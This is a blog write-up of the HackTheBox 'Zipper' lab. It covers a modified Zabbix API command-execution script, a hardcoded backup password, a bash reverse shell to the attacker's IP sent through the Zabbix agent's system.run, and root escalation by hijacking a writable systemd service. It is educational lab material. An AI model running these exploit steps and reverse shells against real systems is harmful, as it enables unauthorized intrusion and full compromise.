---
layout: post
title: HackTheBox - Zipper Writeup
tags: [hackthebox]
---

Things have been busy and I haven't done a writeup in a while nor much HackTheBox. However I made time for this box as it was not only created by my friend [burmat](https://nathanburchfield.com/) but it also involved software that I heavily used as a sysadmin which made me more interested. The box was also very realistic and fun in my opinion.

## Enumeration

Nmap to kick things off.

```
root@kali:~# nmap -p- -sV 10.10.10.108 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-09 10:11 EST
Nmap scan report for 10.10.10.108
Host is up (0.061s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
10050/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Poking at the webserver we get the default Apache page. Running `gobuster` leads us to our first step.

```
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.108

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.108/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/zabbix (Status: 301)
=====================================================
```

And we have a Zabbix login.

![login](/img/zipper_login.png)

Trying some quick win logins such as admin/admin leads to nothing. However we can sign in as a guest.

Clicking over to _Latest Data_ tab we see the following:

![data](/img/zipper_data.png)

So we have the Zabbix server itself and also the host named Zipper. We also have a username of Zapper who apparently has a backup script. Trying the login page again with zapper/zapper leads us to this:

![no-gui](/img/zipper_nogui.png)

So we cannot login to the GUI, however this means some other type of access is possible through the Zabbix API.

It just so happens someone has already scripted an API shell with Python [here](https://www.exploit-db.com/exploits/39937).

The issue we run into with this script is it requires the host id to be known to execute the commands on, which we currently do not have. However, after examining the API documentation [here](https://www.zabbix.com/documentation/3.0/manual/api/reference/host/get) we can just have the API tell us the host id by adding in this code into the script.

```python
host_get = {
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": [
            "hostid",
            "host"
        ],
        "selectInterfaces": [
            "interfaceid",
            "ip"
        ]
    },
    "id": 2,
    "auth": auth['result'],
}

host_id = requests.post(url, data=json.dumps(host_get), headers=(headers))
host_id = host_id.json()
```

Full exploit updated:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-


import requests
import json
import readline


url = 'http://10.10.10.108/zabbix/api_jsonrpc.php'

login = 'zapper'
password = 'zapper'

# auth to API
payload = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
    	'user': ""+login+"",
    	'password': ""+password+"",
    },
   	"auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()

# find the host id

host_get = {
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": [
            "hostid",
            "host"
        ],
        "selectInterfaces": [
            "interfaceid",
            "ip"
        ]
    },
    "id": 2,
    "auth": auth['result'],
}

host_id = requests.post(url, data=json.dumps(host_get), headers=(headers))
host_id = host_id.json()


while True:
    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break
 
# update
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": ""+cmd+""
        },
        "auth" : auth['result'],
        "id" : 0,
    }
 
    cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
 
# execute
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": host_id['result'][0]['hostid'],
        },
        "auth" : auth['result'],
        "id" : 0,
    }
 
    cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
    cmd_exe = cmd_exe.json()
    print cmd_exe["result"]["value"]
```

```
root@kali:~/htb# ./zipper.py 
[zabbix_cmd]>>:  whoami
zabbix

[zabbix_cmd]>>:  hostname
c1b730b82aad
```

We find Zapper's backup script in `/usr/lib/zabbix/externalscripts`.

```
[zabbix_cmd]>>:  cat /usr/lib/zabbix/externalscripts/backup_script.sh
#!/bin/bash
# zapper wanted a way to backup the zabbix scripts so here it is:
7z a /backups/zabbix_scripts_backup-$(date +%F).7z -pZippityDoDah /usr/lib/zabbix/externalscripts/* &>/dev/nul
```

And we have a password!

## Getting User

So we now have a shell on the Zabbix server. However this is not the final goal as we need to get to Zipper and off the Zabbix server. If we check `ifconfig` we see that our IP address is 172.17.0.2.

```
[zabbix_cmd]>>:  ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 22808  bytes 1982532 (1.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23989  bytes 3173113 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2178  bytes 125349 (125.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2178  bytes 125349 (125.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

And checking `netstat` we see a connection from a zabbix agent on 172.17.0.1 to the Zabbix server port 10051.

```
[zabbix_cmd]>>:  netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 172.17.0.2:80           10.10.14.30:43090       TIME_WAIT  
tcp        0      0 127.0.0.1:10051         127.0.0.1:41594         ESTABLISHED
tcp        0      0 127.0.0.1:10051         127.0.0.1:41582         TIME_WAIT  
tcp        0      0 127.0.0.1:41576         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 172.17.0.2:80           10.10.14.30:43088       TIME_WAIT  
tcp        0      0 127.0.0.1:41584         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 127.0.0.1:41596         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 172.17.0.2:80           10.10.14.30:43122       ESTABLISHED
tcp        0      0 172.17.0.2:80           10.10.14.30:43120       ESTABLISHED
tcp        0      0 172.17.0.2:80           10.10.14.30:43102       TIME_WAIT  
tcp        1      0 172.17.0.2:80           10.10.14.30:43110       CLOSE_WAIT 
tcp        0      0 172.17.0.2:80           10.10.14.30:43086       TIME_WAIT  
tcp        0      0 172.17.0.2:10051        172.17.0.1:41064        TIME_WAIT  
tcp        0      0 127.0.0.1:41594         127.0.0.1:10051         ESTABLISHED
tcp        0      0 127.0.0.1:41604         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 127.0.0.1:41606         127.0.0.1:10051         ESTABLISHED
tcp        0      0 127.0.0.1:10051         127.0.0.1:41590         TIME_WAIT  
tcp        0      0 127.0.0.1:41566         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 127.0.0.1:41570         127.0.0.1:10051         TIME_WAIT  
tcp        0      0 127.0.0.1:10051         127.0.0.1:41606         ESTABLISHED
tcp        0      0 172.17.0.2:80           10.10.14.30:43112       TIME_WAIT  
tcp6       0      0 :::10051                :::*                    LISTEN
```

Since we are the Zabbix server we can interact directly with the Zabbix agent on port 10050. And we can also execute commands through the agent using `system.run`!

```
[zabbix_cmd]>>: echo "system.run[(/bin/bash -c 'bash -i >/dev/tcp/10.10.14.30/443 0<&1 2>&1 &')]" | nc 172.17.0.1 10050
```

And catch the shell.

```
root@kali:~/htb# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.108] 50120
bash: cannot set terminal process group (24274): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zipper:/$
```

Now we import a pty with python, then we can `su` to Zapper.

```
zabbix@zipper:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@zipper:/$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K	/backups/zapper_backup-2019-02-26.7z
4.0K	/backups/zabbix_scripts_backup-2019-02-26.7z
```

From here we can grab Zapper's ssh key and use that for a more stable shell.


## Escalating to Root


Utilizing `journalctl` we can query the live contents of the systemd journal. After a short period we see the following:

```
zapper@zipper:/$ journalctl -f
-- Logs begin at Sat 2018-09-08 02:45:49 EDT. --
~
~
Sep 10 10:50:26 zipper systemd[1]: Started Purge Backups (Script).
Sep 10 10:50:26 zipper purge-backups.sh[24346]: [>] Backups purged successfully
```

We can see that systemd is running a purge-backups.sh script every so often. We can check the service files for systemd in /etc/systemd/system.

```
zabbix@zipper:/etc/systemd/system$ ls -al
total 64
drwxr-xr-x 13 root root   4096 Oct  2 13:18 .
drwxr-xr-x  5 root root   4096 Sep  8 06:42 ..
lrwxrwxrwx  1 root root     44 Sep  8 06:40 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
drwxr-xr-x  2 root root   4096 Sep  8 06:43 default.target.wants
drwxr-xr-x  2 root root   4096 Sep  8 06:43 emergency.target.wants
drwxr-xr-x  2 root root   4096 Sep  8 06:40 getty.target.wants
drwxr-xr-x  2 root root   4096 Sep  8 06:43 graphical.target.wants
drwxr-xr-x  2 root root   4096 Oct  2 13:18 multi-user.target.wants
drwxr-xr-x  2 root root   4096 Oct  2 13:18 network-online.target.wants
-rw-rw-r--  1 root zapper  132 Sep  8 13:22 purge-backups.service
-rw-rw-r--  1 root zapper  237 Sep  8 13:22 purge-backups.timer
drwxr-xr-x  2 root root   4096 Sep  8 06:43 rescue.target.wants
drwxr-xr-x  2 root root   4096 Sep  8 07:11 sockets.target.wants
lrwxrwxrwx  1 root root     31 Sep  8 06:49 sshd.service -> /lib/systemd/system/ssh.service
-rw-r--r--  1 root root    147 Sep  8 13:03 start-docker.service
drwxr-xr-x  2 root root   4096 Sep  8 06:43 sysinit.target.wants
lrwxrwxrwx  1 root root     35 Sep  8 06:41 syslog.service -> /lib/systemd/system/rsyslog.service
drwxr-xr-x  2 root root   4096 Sep  8 06:41 timers.target.wants
drwxr-xr-x  2 root root   4096 Sep  8 13:24 zabbix-agent.service.wants
```

We can see the purge-backups.service allows Zapper to write.

```
zabbix@zipper:/etc/systemd/system$ cat purge-backups.service
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/root/scripts/purge-backups.sh
[Install]
WantedBy=purge-backups.timer
```

So now all that's left to do is replace ExecStart with a script of our choosing.

We place a simple bash reverse shell in /tmp.

```
#!/bin/bash 
bash -i >/dev/tcp/10.10.14.30/443 0<&1
```

```
zapper@zipper:/etc/systemd/system$ chmod +x /tmp/shell.sh
```

Edit the contents of purge-backups.service.

```
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/tmp/shell.sh
[Install]
WantedBy=purge-backups.timer
```

However systemd has not been reloaded to read the updated service file, so it will continue to run the old script until it's been reloaded. This usually require root privileges.

In Zapper's home directory is a utils folder with a setuid binary.

```
zapper@zipper:~/utils$ ls -al
total 20
drwxrwxr-x 2 zapper zapper 4096 Sep  8 13:27 .
drwxr-xr-x 6 zapper zapper 4096 Feb 26 11:08 ..
-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service
```

Running the binary seems to allow starting and stopping of the service.

```
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?:
```

Running strings on the binary we can see it reloading systemd with `systemctl daemon-reload`.

```
zapper@zipper:~/utils$ strings zabbix-service
~
~
start or stop?: 
start
systemctl daemon-reload && systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
~
~
```

We can now run `zabbix-service`, stop then start it, and catch our shell.

```
zapper@zipper:~/utils$ ./zabbix-service stop
zapper@zipper:~/utils$ ./zabbix-service start
```

```
root@kali:~/htb# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.108] 51242
id
uid=0(root) gid=0(root) groups=0(root)
hostname
zipper
```